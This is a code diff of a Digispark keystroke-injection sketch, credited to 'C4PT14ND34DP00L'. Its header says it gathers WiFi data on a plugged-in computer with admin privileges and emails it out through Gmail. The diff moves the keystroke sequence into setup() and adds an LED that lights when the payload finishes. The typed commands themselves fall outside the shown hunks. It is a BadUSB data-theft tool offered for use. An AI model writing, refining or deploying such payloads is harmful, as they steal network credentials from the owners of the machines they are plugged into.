@@ -1,17 +1,13 @@
 /********************************************************************************
-  Gather WiFi data and email it
-  Change line 23 and 36 ('Desktop') to location you want file saved
-  Change line 36 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
-  Change line 47 to set location file was saved
-  !!!NEED ADMIN PRIVILEGES!!! 
+  Gather WiFi data and email it,  !!!NEED ADMIN PRIVILEGES!!! 
+  Change line 19 and 32 ('Desktop') to location you want file saved
+  Change line 32 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
+  Change line 43 to set location file was saved
   CREDIT: C4PT14ND34DP00L
 *******************************************************************************/
 
 #include "DigiKeyboard.h"
 void setup() {
-}
-
-void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
@@ -62,7 +58,14 @@ void loop() {
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
+  
+  //Light up the onboard LED when the script is done
+  int ledPin = 1;
+  digitalWrite(ledPin, HIGH);
   for (;;) {
     /*empty*/
   }
+}
+
+void loop() {
 }
